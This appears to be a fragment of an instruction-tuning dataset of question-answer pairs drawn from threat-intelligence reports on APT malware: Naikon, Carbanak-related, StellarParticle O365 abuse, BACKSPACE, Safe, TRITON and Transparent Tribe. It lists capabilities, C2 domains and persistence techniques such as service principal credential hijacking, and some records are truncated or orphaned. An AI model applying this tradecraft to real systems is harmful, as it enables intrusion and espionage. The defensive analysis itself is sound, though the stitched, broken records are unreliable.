    "instruction": "Big Headline: SHARED EXPLOIT GENERATION KIT\nIt's interesting that what appear to be multiple campaigns and crews all use a kit that generates CVE-2012-0158 exploits embedded with arbitrary backdoors for spear-phishing. One of the interesting characteristics of the Naikon APT's kit-produced shell-code is its runtime function offset calculations and control flow are built to jump past behavior-based protection and sandbox analysis. Each of the win32 api shellcode calls are carefully executed to land just past function hot patch space and prologues, evading user mode trampolines and hooks.\nMsnMM, Naikon and Rarstone backdoors were generally delivered with stock 0158 exploits. Some dropped iph.bat and an \"iExplorer.exe\" that began with a \"WMcal\" parameter and profile.dat executable blob loaded into a running IE process. Other APTs use this kit as well. We found Stone Panda Poison Ivy samples delivered with the same CVE-2012-0158 exploits, dropping iph.bat and iExplorer.exe, and running the \"iExplorer.exe WMcal\" executable filename and parameter.\nFinally, we found another exploit builder's template used to attack Korean-speaking targets. It was used across this group and others for building CVE-2012-0158 files, sharing the common author \"Tran Duy Linh\".\nMedium Headline: Similar strings\nWhile the Naikon backdoor maintained the user-agent string \"NOKIAN95/WEB\", it also maintained a debug path\nf:\\MyProjects\\xServer\\Release\\xServer.pdb\nAlso, the Naikon backdoor's matching management software is called \"xsControl\". Plugins for the Naikon backdoor included a screenshot grabber named xsAdv.dll, and a single export \"XS_Screencap\".\nThis debug path in Naikon backdoors is very similar to the debug path maintained in Rarstone backdoors:\ng:\\MyProjects\\xsFunction\\Release\\DLL.pdb\nThe MsnMM campaign backdoors all maintain an \"MM\" internal name, and the functionality changes when comparing them:\n\u2022 WinMM\n\u2022 WininetMM\n\u2022 SslMM\nA more recent oddity from this group includes a WinMM dropper with the internal name \"Zhixin\", creating a recently compiled Sys10 backdoor.\nSome \"MM\" executables maintained debug strings across versions and families:\nJ:\\chong\\new\\Release\\SslMM.exe\nand\nJ:\\chong\\nod\\Release\\SslMM.exe\nMedium Headline: Shared infrastructure\nNow, let's take a look at some of the shared infrastructure that helps to tie all of these campaigns together. MsnMM backdoors and naikon backdoors share portions of infrastructure across campaigns. For a quick example, early msnMM back-doors like sslMM, and one of the later tools, exe_exchange, share some domains with the nokian95 (naikon) and sys10 backdoors. There is much crossover.\nHere, you can see a table recording domains that are shared across the backdoors for command and control infrastructure.\nMedium Headline: Correlating target profiles with spear-phish and decoy content\nOne of the most striking characteristics of this APT is that its targeting interest is revealed by its spear-phish and decoy content. Malicious actors of all stripes, including cybercriminals, have for at least the last ten years abused \"hot topics\" in their social-engineering content to better attract and mass-exploit victim systems. It's a pretty worn-out discussion. What is different about the Naikon APT's use of hot topics in spear-phish and decoy content is that reveals its specific victims and how these change over time. Precision social engineering seems to be an elevated skill set for the group.\nA few of the most interesting examples of such content include: a UN discussion and vote on nuclear proliferation and disarmament, the MH370 flight, and construction on the Raytheon-built National Coast Watch Center in PH.\nFor example, in the second week of October 2012, during the gang's intense ongoing focus on SE Asian countries like Cambodia and its diplomats, we find a winMM backdoor detected as \"Trojan.Win32.Agent.udtc\" in New York City. This verdict identified the Naikon\nAPT's backdoor on the victim system. The timing is uncanny because, in that same week speeches and views on nuclear disarmament and non-proliferation were presented by SE Asian country delegates to the United Nations in New York City. An example of such a (<http://www.un.org/disarmament/special/meetings/firstcommittee/67/pdfs/11%20Oct%20GD%20Cambodia.pdf>)talk (<http://www.un.org/disarmament/special/meetings/firstcommittee/67/pdfs/11%20Oct%20GD%20Cambodia.pdf>)is here; a naikon decoy's content was strikingly similar:\nMsnMM campaigns most commonly presented spear-phish exploits targeting CVE-2012-0158. A listing of screenshots in Appendix A reveals the variety of content and themes, all related to events and topics in the ASEAN region. Example titles include:\nThe following example's content was crafted to appear like a legitimate international agreement discussion. After the malicious document is opened and successfully exploits CVE-2012-0158 on the victim workstation, the exploit code drops and opens this decoy Word document:\nThis next example is written with the Laotian Phetsarath OT font, a decoy attempt to be a legitimate Daily News Brief from the Laotian Foreign Ministry of Affairs. It demonstrates the group's intentions to hit targets in Laos:\nAppendix A contains many more example document titles and screenshots. The themes and content that would appeal to politically-interested individuals in various parts of the world quickly become obvious.\nIn addition to a high volume of files exploiting CVE-2012-0158, the MsnMM attackers for a brief period used RTLO (right to left override) techniques, and then attachments exploiting CVE-2010-3333. An example of RTLO that creates and opens this decoy document to camouflage its malicious background activity, then dropping and executing MsnMM backdoors on its victim system:\nUNFC_Statement_final_rcs.pdf\nMedium Headline: SslMM\nThe MsnMM gang built and released many more variants of their sslMM creation. The code is a full-featured backdoor. Each variant of this tool starts by attempting to create a socket, and then creates a new thread implementing a fairly complicated keylogging facility not often seen, using Windows Keyboard Accelerators. Online code demonstrates the technique here:\nhttp://thronic.com/Win32%20Keylogging/\nThe backdoor retrieves a large number of victim system data points, which it then uses to check in to its hardcoded C2. The backdoor reports system identification information both to present the victim's identifying information and to fingerprint the system for asset management:\n\u2022 OS version\n\u2022 Service pack information\n\u2022 Processor speed\n\u2022 System name\n\u2022 Logged-on user name\n\u2022 OS install date\nOne of its more interesting features is the ability to fetch and use certificates from the \"My\" store on Windows systems. The \"My\" certificate store is created on a per-user basis, and this is where users' certificates are stored. It is reserved for each user for signing and decrypting data and encrypting network communications.\nFeature list:\n\u2022 Victim fingerprinting and performance sensitivity \u2013 system configuration collection\n\u2022 Persistence \u2013 immediately identifying the Start Menu Startup directory and dropping a LNK to its own executable disguised as a \"Office Start\", \"Yahoo Talk\", \"MSN Gaming Z0ne\", or \"MSN Talk\" shortcut\n\u2022 Configurable network settings \u2013 both a primary and backup C2 string is hard-coded in each backdoor. At this point, we are aware of almost 50 domains and unique IP addresses used to host C2\n\u2022 Keylogging facility \u2013 Windows Accelerators with hidden window and lengthy Accelerator table\n\u2022 Flexible network connectivity \u2013 proxy support for use with victim systems situated behind isolated networks\n\u2022 GET and POST network code for exfiltrating system information\n\u2022 Log file capabilities\n\u2022 File search and file write primitives \u2013 identifying and collecting sensitive ondisk information\n\u2022 Download and execute further arbitrary downloads\n\u2022 Arbitrary inter-process launch and communication through named pipes\n\u2022 Process privilege and token adjustments\n\u2022 Anti-malware kill-process identification and termination\n\u2022 Digital Certificate stealing and reuse for stealth SSL communications\n\u2022 Network server listener\nQuestion: What are the key features of the sslMM backdoor used by the Naikon APT, and how does it collect and utilize victim system data?",
    "output": "Answer: The sslMM backdoor used by the Naikon APT is a full-featured backdoor with several notable features. It starts by attempting to create a socket and implements a keylogging facility using Windows Keyboard Accelerators. It collects a large number of victim system data points, including OS version, service pack information, processor speed, system name, logged-on user name, and OS install date. These data points are used to check in to its hardcoded C2 and fingerprint the system for asset management. Additional features include persistence mechanisms, configurable network settings, proxy support, GET and POST network code for data exfiltration, log file capabilities, file search and write primitives, download and execution of further arbitrary downloads, inter-process communication, process privilege adjustments, anti-malware kill-process identification, digital certificate stealing for stealth SSL communications, and a network server listener.",

The binary of the testing version was signed with a Blik certificate: moreover, Spy.Agent.ORM shares some similarities in the code with \"the regular\" Carbanak malware.\nThe Win32/Spy.Agent.ORM malware family is already known in the industry because of two blogposts. In July 2015 security company Cyphort (<http://www.cyphort.com/unicredit-compromised/>)reported the compromise of a news portal and a banking site \u2013 rbc.ua and unicredit.ua. It (<http://www.cyphort.com/unicredit-compromise-continued/>)turns out that the compromised sites served Win32/Spy.Agent.ORM. After that, Blue Coat (<https://www.bluecoat.com/security-blog/2015-08-21/tinted-cve-decoy-spearphising-attempt-central-bank-armenia-employees>)reported a spearphishing attempt targeting Central Bank of Armenia employees, the payload being the same.\nThis malware appeared on our radar at the beginning of summer 2015, and afterwards we started to track it.\nWe have seen attempts to attack various companies in Russia and Ukraine using spearphishing e-mails that have malicious attachments consisting of .SCR files or .RTF exploits.\nHere is an example of a spearphishing email sent to one of the biggest Forex-trading companies:\nRoughly translated from Russian to English, it says:\n\"Due to the high volatility of the ruble exchange rate the Bank of Russia sends rules of trading on the currency market.

The malware is typically distributed through spearphishing emails containing malicious attachments such as .SCR files or .RTF exploits. These emails often use social engineering techniques to trick recipients into opening the attachments, which are disguised with legitimate-looking icons and names. For instance, one email targeted a large Forex-trading company with a message about new trading rules due to currency volatility, while another targeted a major electronic payment service in Russia with a message about blocking materials according to a government order.",

    "output": "The assessment methodology involves several key steps to determine if an email contains politically motivated malware. First, an initial inspection is conducted to identify social engineering tactics in the email message and attachment. Then, the email is correlated with others to identify known malware. Suspected emails undergo further analysis, including running the attachment in a sandboxed VM to detect malicious activity, checking the MD5 hash against the Virus Total database, and manually examining the file for signs of malicious intent. Detailed technical analysis follows, involving manual verification of the file type, identification of vulnerabilities using the CVE system, and analysis of network traffic to identify C&C servers. Additional tools like IDA and OllyDbg are used for static and dynamic analysis to identify relationships between malware campaigns and adversaries.",

    "instruction": "Answer based on context:\n\nBig Headline: O365 Built-in Service Principal Hijacking\nThe threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy. Using the Windows Azure Active Directory PowerShell Module, the threat actor connected to the victim's O365 tenant and began performing enumeration queries. These queries were recorded in text-based logs that existed under the path\nC:\\Users\\<user>\\AppData\\Local\\Microsoft\\Office365\\Powershell\\ .\nSimilar logs (for Azure AD instead of O365) can be found under the path:\nWhile the logs didn't include what data was returned by the queries, they did provide some insight such as the user account used to connect to the victim's O365 tenant (which was not the same as the user the threat actor used to RDP to the vCenter server). The logs contained commands issued and the count of the results returned for a specific command. The commands included enumeration queries such as:\nListAccountSkus\nListPartnerContracts\nListServicePrincipals\nListServicePrincipalCredentials\nListRoles\nListRoleMembers\nListUsers\nListDomains\nGetRoleMember\nGetPartnerInformation\nGetCompanyInformation\nIn this case, however, the most significant and concerning log entry was one that indicated the command AddServicePrincipalCredentials was executed. By taking the timestamp that the command was executed via the PowerShell logs on the local system, CrowdStrike analyzed the configuration settings in the victim's O365 tenant and discovered that a new secret had been added to a built-in Microsoft Azure AD Enterprise Application, Microsoft StaffHub Service Principal, which had Application level permissions. Further, the newly added secret was set to remain valid for more than a decade. This data was acquired by exporting the secrets and certificates details for each Azure AD Enterprise Application.\nThe Service Principal (now renamed to Microsoft Teams Shifts ) had the following permissions at the time the configuration settings were collected:\nMember.Read\nMember.Read.All\nMember.ReadWrite\nMember.ReadWrite.All\nShift.Read\nShift.Read.All\nShift.ReadWrite\nShift.ReadWrite.All\nTeam.Read\nTeam.Read.All\nTeam.ReadWrite\nTeam.ReadWrite.All\nUser.Read.All\nUser.ReadWrite.All\nWebHook.Read.All\nWebHook.ReadWrite.All\nCrowdStrike was unable to find Microsoft documentation, but based on open-source research,7 this application likely had the following permissions around the time of registration:\nMail.Read\nGroup.Read.All\nFiles.Read.All\nGroup.ReadWrite.All\nThe most notable permissions above are the Mail.Read , Files.Read and\nMember.ReadWrite  permissions. These permissions would allow the threat actor to use the Microsoft Staffhub service principal to read all mail and SharePoint/OneDrive files in the organization, as well as create new accounts and assign administrator privileges to any account in the organization.\nBy running the commands from within the victim's environment, MFA requirements were bypassed due to conditional access policies not covering Service Principal sign-ins at this point of time.8  However, as explained earlier, the threat actor managed to continue to access the victim's cloud environment even when the victim enforced MFA for all connections regardless of source.\nWhile the bulk of the evidence for this activity came from the text-based O365 PowerShell logs, the NTUSER.DAT registry hive for the user that was running the PowerShell cmdlets also included information on the accounts that were used to authenticate to the cloud. This information was stored under the registry path. Below is an example of the registry data:\nThe same WSMan connection string was also located in the user's NTUSER.DAT registry hive under the path:\nWhile not strictly related to the O365 PowerShell activity, the Windows Event Log Microsoft-Windows-WinRM%4Operational.evtx also included information on connection attempts made to external O365 tenants. This information was logged under Event ID 6. Below is an example of what the event included:\nMedium Headline: Attacker-created Service Principal\nFirst, the threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name. This Service Principal was granted company administrator privileges. From there, the threat actor added a credential to this Service Principal so that they could access the Service Principal directly, without use of an O365 user account.\nThese actions were recorded in Unified Audit Logs with the following three operation names:\nAdd service principal\nAdd member to role\nAdd service principal credentials.\nUpdate Service Principal\nMedium Headline: Company-Created Service Principal Hijacking\nNext, the threat actor utilized the threat actor-created Service Principal to take control of a second Service Principal. This was done by adding credentials to this second Service Principal, which was legitimately created by the company. This now compromised company-created Service Principal had mail.read graph permissions consented on behalf of all users within the tenant.\nThis action was recorded by just one operation type in Unified Audit Logs. This operation type is named Add service principal credentials .\nMedium Headline: Mail.Read Service Principal Abuse\nFinally, the threat actor utilized the compromised Service Principal with the assigned mail.read permissions to then read emails of several different users in the company's environment.\nCrowdStrike was able to use the Unified Audit Logs' (UAL) MailItemsAccessed operation events to see the exact emails the threat actor viewed, as the majority of the users in the tenant were assigned O365 E5 licenses. When performing analysis on the UAL, CrowdStrike used the ClientAppId value within the MailItemsAccessed operation and cross-correlated with the Application ID of the compromised service principal to see what activities were performed by the threat actor.\nBig Headline: O365 Application Impersonation\nAnother consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation 9  role. When this role was assigned to a particular user that was controlled by the threat actor, it allowed the threat actor to impersonate any user within the O365 environment. These impersonated events are not logged verbosely by the Unified Audit Logs and can be difficult to detect.\nWhile the assignment of these ApplicationImpersonation roles were not logged in the Unified Audit Logs, CrowdStrike was able to identify this persistence mechanism via the management role configuration settings, which can be exported with the Exchange PowerShell command:\nGet-ManagementRoleAssignment -Role ApplicationImpersonation .\nCrowdStrike then analyzed the exported configuration settings and identified several users (not service accounts) that the threat actor likely gave direct ApplicationImpersonation roles during the known periods of compromise.\nBig Headline: Remote Tasklist\nThe threat actor attempted to remotely list running processes on systems using tasklist.exe . As tasklist uses WMI \"under the hood,\" this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system. Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028. A sample of the information included with this event is below:\nThis remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in. While unproven, it's possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome. This is because a current or recent Chrome session to the victim's cloud tenants would be potentially beneficial in the hijacking of sessions that the threat actor performed in order to access the victim's cloud resources.\nBig Headline: FTP Scanning/Identity Knowledge\nIn one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible. Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful. There was little to no activity during the (S)FTP sessions. This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to what's described in the Credential Hopping section earlier. Some of the accounts used were not in the victim's Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database. However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victim's environment.\nAfter confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN. The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement. Eventually, the threat actor attempted an account that they had the correct password for but that had not been set up with MFA. This resulted in a prompt being displayed to the threat actor that included an MFA setup link. The threat actor subsequently set up MFA for the account and successfully connected to the victim's network via VPN.\n\nHow did the threat actor utilize the compromised O365 administrator account to create and manipulate Service Principals for persistent access?",
    "output": "The threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name and granted it company administrator privileges. They then added a credential to this Service Principal, allowing them to access it directly without using an O365 user account. This action was recorded in Unified Audit Logs under operation names such as 'Add service principal', 'Add member to role', and 'Add service principal credentials'. The threat actor also took control of a second, legitimate company-created Service Principal by adding credentials to it, which had mail.read graph permissions consented on behalf of all users within the tenant.",

    "instruction": "Russian Army Exhibition Decoy Leads to New BISKVIT Malware\nAugust 20, 2018\nThreat Research\nBy | August 20, 2018\nA few days ago, the FortiGuard Labs team found a malicious PPSX file exploiting CVE-2017-0199 that had been crafted for Russian speakers. The filename \"\u0412\u044b\u0441\u0442\u0430\u0432\u043a\u0430\" when translated means \"Exhibition\".

If <CSIDL_PROFILE>\\Microsoft Office\\BIN\\UpdateWord.exe is a valid PE, start a new process.\nBACKSPACE uses the same mutex (MicrosoftZjZRLnk), and event names (MicrosoftZjZRLnkExit, MicrosoftZjZRLnkHaveExit) across different versions of the same variant. Thus, the malware can remove the previous version and update to a newer version while ensuring that only one instance of the same backdoor family is installed on a given host.\nWhen the malware is updated, the randomly generated hostid from the initial infection (stored in the registry) is not changed. From the attacker's perspective, this allows the \"identity\" of the victim host to remain consistent, even across multiple version updates.\nMedium Headline: Second Stage C2 Server\nNext, BACKSPACE makes an HTTP request to the primary C2 URL domain (www.bigfixtools[.]com or www.km153[.]com) and URL path /ForZRLnk3z/dizhi.gif.  Dizhi.gif is a 10-byte configuration file that specifies an IP address and two port numbers.\nBACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP, SystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain, and information about the logical drives) to Port1 on the new C2 server. The malware will use the victim computer's saved proxy settings if needed. The data is sent using an HTTP POST request with the following structure:\nTable 10:  BACKSPACE \"ZRLnk\" callback structure\nA sample beacon is shown below. Note that the HTTP User-Agent header is set to the non-standard value \"SJZJ (compatible; MSIE 6.0; Win32)\".\nBACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary C2 URL domain. If the victim computer's hostname and hostid are found in the file, the victim will attempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to directly interact with the victim via the BACKSPACE controller.35  After establishing the connection to the controller, BACKSPACE awaits further interactive commands from the operator. For this copy of BACKSPACE, the following commands are supported:\nTable 11: Commands supported by BACKSPACE \"ZRLnk\" variant 6ee35da59f92f71e757d4d5b964ecf00\nAfter each command is processed, BACKSPACE sends a status message to the C2 server; messages starting with \"O\" indicate success, messages starting with \"E\" indicate failure.\nMedium Headline: Configuration and C2 Encoding\nWhile earlier versions of BACKSPACE may contain the C2 domains and other variables in plain text within the binary, they are encoded within this (and other more recent) variants. Decoding is done in two ways: by adding an incremental counter, or by XORing and bitwise shifting bytes.\nIn addition, binary (non-string) data transferred between the victim host and the second stage C2 server is encoded/decoded by adding an incremental counter and XORing with 0x23, as shown below.\nMedium Headline: Host-Based Firewall Bypass\nThis variant of BACKSPACE includes functionality to attempt to bypass a number of personal firewall applications. BACKSPACE iterates through open windows and matches the type (Button) and its associated Window Text against a set of strings stored within the malware. If a match is found, BACKSPACE sends a message to simulate a mouse click, attempting to \"approve\" firewall rules to allow the malware to execute. Both English and Chinese strings are stored, implying that the malware attempts to target versions of the products below that are localized for those languages.37\nTable 12: Strings used in attempt to bypass host-based firewalls\nQ: Describe the encoding methods used by BACKSPACE for its configuration and C2 communications. How does the malware handle binary data transfer between the victim host and the second stage C2 server?",

This choice of key is notable because it demonstrates a sense of humor on the part of the malware authors. From a technical perspective, the use of a fixed key for decryption can be exploited by analysts to reverse-engineer the malware and understand its inner workings. By identifying the decryption routine and the key, security experts can decrypt the strings used by the malware, revealing critical information about its functionality and targets. This insight can aid in developing signatures and heuristics for detecting the malware.",

Use of this information constitutes acceptance for use in an \"as is\" condition.\nBig Headline: Attack Vector\nThe distribution mechanism the Safe campaign used involved spear-phishing emails that contain a malicious attachment. This technique, which is quite common for APT campaigns, encourages a recipient to open a malicious attachment by sending an email with contextually relevant content.1\nWe discovered several malicious documents that all exploited a Microsoft Office\u00ae vulnerability (i.e., CVE-2012-0158).2 If opened with a version of Microsoft Word\u00ae that is not up-to-date, a malicious payload is silently installed on the user's computer.\n1\n2\nIn addition to the Tibetan-themed attack vector, we found documents written in Mongolian though their exact targets remain unclear.\nMedium Headline: First Stage\nOpening the malicious document on a system running a vulnerable version of Microsoft Office opens the decoy document for the user to view. Note though that this also drops malicious files onto the system that allows the attackers to take control of it. After the initial compromise, the attackers may then steal files from the compromised system.\nThe decoy document, NBC Interview_Excerpts.doc, has the MD5 hash, a2da9cda33ce378a21f54e9f03f6c0c9efba61fa. It drops the following files:\n\u2022 smcs.exe (91e6277a70d48ed953ac9208275e5dc855a8f7a7), which contains:\n\u2022 SafeCredential.DAT (303e982d0929ca2c50809323dff66be38a46926a)\n\u2022 SafeExt.org (2029399fb4be3d88c2ba0a7544b1ebec58157639), which contains:\n\u2022 SafeExt.dll (cde35c8da8c420aeaf5adda14ba68d18010479fa)\nThe malware the malicious documents drop has several components, including:\n\u2022 SafeExt.dll: Contains the malware's main functionality.\n\u2022 SafeCredential.DAT: Contains the RC4 key, C&C information, and campaign \"mark.\"\nIf User Account Control (UAC) is active, SafeExt.dll will be injected into explorer.exe. Otherwise, the file is copied to %Program Files%\\Internet Explorer\\SafeNet\\ and registered as a Browser Helper Object (BHO).3\n3  and\nThe malware then accesses a C&C server over HTTP POST to send data using the domain name and URL path in SafeCredential.DAT. The network traffic is encrypted with the RC4 key in SafeCredential.DAT. One key indicator that can be used to detect this network communication is the user-agent, Fantasia.\nDuring our investigation of the C&C servers associated with Safe, we discovered a backup script that the attackers used to archive the files on them. This allowed us to acquire the source code for the .PHP files used on the C&C servers.\nThe data that the malware sends from a compromised host to report.php is decrypted by the C&C server and stored in a MySQL\u2122 database. In addition to RC4 encryption use, the file's content is XORed with the function in Figure 6.\nThe parameters of the query are unpacked and sent to a function that inserts the information the compromised host provides into the MySQL database. It then checks the database to see if the attackers specified instructions to send to the compromised host. If there are, these instructions are sent back to the compromised host.\nThe REQUEST_TYPE_CLIENT_REQUEST function inserts a unique ID for each compromised host as well as the Internet and external IP addresses, hostname, Windows domain, the system's disc drive information, and a campaign mark. It has a field to store information about any additional malware plug-ins that have been installed on the system.\nThe malware uses the following marks or campaign tags:\n\u2022 120713\n\u2022 120713p\n\u2022 123456\n\u2022 654321\n\u2022 c0814\n\u2022 C0821\n\u2022 L0821\n\u2022 Lewis120713px\n\u2022 N0911\n\u2022 Weber0720p\n\u2022 720p\n\u2022 L1224\nMedium Headline: Tools\nThe tools used by Safe are off-the-shelf programs that are able to extract saved passwords from Internet Explorer\u00ae (IE) and Mozilla Firefox\u00ae as well as any stored Remote Desktop Protocol (RDP) credentials.4\n4 The tools are publicly available at .\nWe found two sets of C&C servers that do not seem to have anything in common apart from being used in conjunction with the same malware. The first set of C&C servers had Mongolian-themed domain names\u2014mongolbaatar. us and mongolbaatarsonin.in. The second set of C&C servers use the domains, getapencil.com, which was registered with a privacy protection service, and withoutcake.com, which was registered by wanxian@126. com. 5 Willyoumarryadog.com may also be a C&C server but we have not yet discovered samples that use this domain name.\nThe Tibetan- and Mongolian-themed attack vectors described earlier are connected to the first infrastructure (i.e., mongolbaatar). We were unable to discover attack vectors for the second C&C infrastructure.\n5 A variety of services can be used so the registrant information required to register a domain name will not be publicly visible in the WHOIS directory.\nBig Headline: Campaign Connections\nOne of the C&C servers used, withoutcake.com, was registered using the email address, wanxian@126.com. This email address has been used to register 17 domain names, five of which have been confirmed to be C&C servers.\nThe domain, sugarsbutters.com, was used in attacks that leveraged images of Russian model, Irina Shayk, and dropped the iMuler malware that affects Mac OS X systems in November 2012.6 Three domains\u2014aq5u.org, prettyb0yinus. com, and shumetheme.org\u2014have also been used as C&C servers for campaigns using the Enfal malware.7\nBig Headline: Identification of Victims\nWe were able to identify victims in two ways. First, we were able to download a list of victims that were currently online from the C&C servers. Second, we were also able to download logs from the C&C servers that listed all of the IP addresses that \"checked in\" to them using the REQUEST_TYPE_CLIENT_ REQUEST function.\nThe first set of C&C servers (i.e., mongolbataar) appeared to have only three \"live\" victims\u2014one with an IP address assigned to South Sudan, another with an address assigned to Mongolia, and another that did not list an external IP address.\nThe logs we obtained from the first set of C&C servers showed that 243 unique IP addresses from 11 different countries checked in to them.\n6  and\n7  and\nThe logs we obtained from the second set of C&C servers (i.e., getapencil. com) showed that 11,563 unique IP addresses from 116 different countries checked in to them.\nTable 2: Top 15 Country Breakdown of Unique IP Address Locations\nWe discovered that on average, 71 victims accessed the getapencil.com C&C server at any given time. The actual total victim count was significantly lower than the number of unique IP addresses though.\nMedium Headline: DECRYPT.exe\nWe also pulled the application, DECRYPT.exe, from a getapencil. com C&C server. This application is a custom encrypter/decrypter for any file inputted into the application. Further analysis of this application shows that it uses large portions of Makoto Matsumoto and Takuji Nishimura's Random Number Generator (RNG) for encryption functionality.8\nOnce the Decrypt button is pressed, a password validation box appears.\nWe were able to identify victim files that were on \"drop servers\" that utilize DECRYPT.exe for encryption/ decryption.\nMedium Headline: Common Tools\nWe also identified security tools with both valid and nefarious purposes and have been used in other campaigns on the C&C servers. We listed some of these along with their functionality below:\n\u2022 LZ77: Used to compress and decompress files.\n\u2022 UPXShell: Commonly used to pack malware in order to make it more difficult for analysts to reverse-engineer.\n\u2022 DebugView: A Microsoft Sysinternals tool that allows you to monitor debug outputs on your local system.\n\u2022 Build.bat: Used to open TypeConfig and \"automate\" malware creation processes.\n\u2022 Compress.bat: Used to automatically compress files defined in a batch file with the aid of LZ77.exe.\n\u2022 PECompress.bat: Used to compress files identified in a batch file with the aid of UPXShell.exe.\n8\n\nAnswer this question based on the above context: What tools does the Safe campaign use to extract saved passwords and RDP credentials, and how are these tools distributed?",
    "output": "The Safe campaign uses off-the-shelf programs to extract saved passwords from Internet Explorer and Mozilla Firefox, as well as any stored Remote Desktop Protocol (RDP) credentials. These tools are publicly available.

    "instruction": "Big Headline: Summary of Malware Capabilities\nThe TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON's extensive reconnaissance capabilities).\nThe TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks.\nBig Headline: Recommendations\nAsset owners who wish to defend against the capabilities demonstrated in the incident, should consider the following controls:\nWhere technically feasible, segregate safety system networks from process control and information system networks. Engineering workstations capable of programming SIS controllers should not be dual-homed to any other DCS process control or information system network.\nLeverage hardware features that provide for physical control of the ability to program safety controllers. These usually take the form of switches controlled by a physical key. On Triconex controllers, keys should not be left in the PROGRAM mode other than during scheduled programming events.\nImplement change management procedures for changes to key position. Audit current key state regularly.\nUse a unidirectional gateway rather than bidirectional network connections for any applications that depend on the data provided by the SIS.\nImplement strict access control and application whitelisting on any server or workstation endpoints that can reach the SIS system over TCP/IP.\nMonitor ICS network traffic for unexpected communication flows and other anomalous activity.\nFigure 3: Triconex Key Switch )\n\nBased on the above text, answer a question. What specific recommendations are provided for asset owners to defend against the capabilities demonstrated by the TRITON malware, particularly focusing on network segregation and physical control measures?",
    "output": "To defend against the capabilities demonstrated by the TRITON malware, asset owners are advised to segregate safety system networks from process control and information system networks wherever technically feasible. Engineering workstations capable of programming SIS controllers should not be connected to any other DCS process control or information system network.

For Triconex controllers, keys should not be left in the PROGRAM mode except during scheduled programming events. Implementing change management procedures for changes to key positions and regularly auditing the current key state are also crucial. Using unidirectional gateways instead of bidirectional network connections for applications dependent on SIS data, implementing strict access control and application whitelisting on relevant endpoints, and monitoring ICS network traffic for unexpected communication flows and anomalous activity are additional recommended measures.",

    "instruction": "Big Headline: Threat actor profile\nTransparent Tribe is a suspected Pakistan-linked threat actor. This group targets individuals and entities associated with governments and military personnel in the Indian subcontinent, specifically Afghanistan and India. Transparent Tribe has also been known to use their CrimsonRAT implant against (<https://www.amnesty.org/en/documents/asa33/8366/2018/en/>)human rights activists in Pakistan.\nThe group primarily uses three Windows-based malware families to carry out espionage activities against their targets.\nCrimsonRAT is a .NET-based implant that has been the group's malware of choice since at least 2020 . Transparent Tribe's multiple campaigns leveraging over the years indicate a steady evolution in the implant's capabilities.\nObliqueRAT is a C/C++-based implant discovered by Talos in early . ObliqueRAT is primarily reserved for highly targeted attacks on government personnel and in operations where stealth is a prime focus of the attackers' infection chain. This implant has also seen a (<https://blog.talosintelligence.com/2021/02/obliquerat-new-campaign.html>)constant evolution in deployment tactics and malicious functionalities over time.\nCustom malware used by Transparent Tribe consists of easily and quickly deployable downloaders, droppers and lightweight RATs containing limited capabilities as opposed to CrimsonRAT and ObliqueRAT.\nTransparent Tribe also maintains a suite of mobile implants in their arsenal. Implants such as (<https://www.trendmicro.com/en_us/research/22/a/investigating-apt36-or-earth-karkaddans-attack-chain-and-malware.html>)CapraRAT are constantly modified to be deployed against targets. These implants contain a plethora of malicious capabilities meant to steal data from mobile devices.\nMedium Headline: Latest variant\nThe latest downloaders primarily masquerade as installers for Kavach and are distributed for delivering malicious artifacts to targets. Kavach is widely used by government personnel, as it allows employees (including military personnel) to access the Indian government's I.T. resources, such as email services.\nThe droppers are .NET-based executables. They begin execution by checking if the timezone on the infected endpoint contains keywords such as \"India.\" A splash screen is displayed to the victim notifying them that the Kavach application is being installed:\nFake installation splash screen\nThe downloaders will then reach out to a malicious website, masquerading as a legitimate Indian government or pseudo-government entity, to download a malicious payload that is then activated on the endpoint.\nNext, download a legitimate copy of the Kavach application's MSI installer from yet another attacker-controlled website and execute it to make the whole attack chain appear legitimate.\nDownloader fetching and executing malicious payload and legitimate installer for Kavach.\nMedium Headline: Additional variant\nAnother variation of the initial infection vector used in the campaign is a notably large downloader binary (141MB) that contains the entire legitimate installer (MSI) for the Kavach application in its resources. The zipped copy of the MSI is extracted from the downloader's resources and executed on the system as a decoy to appear legitimate to the targets. The actual implant is then downloaded from a remote location, AES-decrypted using a hardcoded key, written to disk and executed on the infected endpoint.\nThe second variant of the downloader downloads and decrypts the payload from a remote location.\nMedium Headline: A timeline of older variants\nAs early as June 2021, the attackers primarily used malicious documents (maldocs) as an initial infection vector to deliver the malicious downloaders. This vector consisted of a malicious macro that would download and activate the downloader on the infected endpoint. This practice 